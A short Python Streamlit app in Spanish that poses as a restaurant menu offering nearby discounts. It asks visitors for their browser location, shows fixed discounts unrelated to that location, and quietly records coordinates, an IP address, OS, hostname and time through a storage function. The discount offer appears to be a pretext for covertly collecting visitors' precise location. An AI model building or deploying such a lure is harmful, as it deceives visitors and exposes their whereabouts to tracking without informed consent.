import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos, obtener_visitas

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# Obtener ubicación con streamlit-geolocation
location = streamlit_geolocation()

# Función para validar lat/lon y que no sean None
def valid_coords(loc):
    if loc and isinstance(loc, dict):
        lat = loc.get("latitude")
        lon = loc.get("longitude")
        if isinstance(lat, (float, int)) and isinstance(lon, (float, int)):
            return lat, lon
    return None, None

lat, lon = valid_coords(location)

if lat is None or lon is None:
    if location is None:
        st.info("Por favor, pulsa el botón y acepta la solicitud de ubicación en tu navegador.")
    else:
        st.error("No se pudo obtener la ubicación. Por favor, revisa los permisos en el navegador.")
else:
    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
    st.subheader("Descuentos cercanos para ti:")
    st.markdown("""
    - 🍕 Pizza Margarita -20%
    - 🍣 Sushi Deluxe -15%
    - 🥗 Ensalada Mediterránea -10%
    """)

    # Registrar datos
    user_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "lat": lat,
        "lon": lon,
        "ip": requests.get("https://api.ipify.org").text,
        "browser": "N/A",  # Puedes extender aquí si quieres obtener user-agent
        "os": platform.system(),
        "hostname": socket.gethostname()
    }

    guardar_datos(user_data)
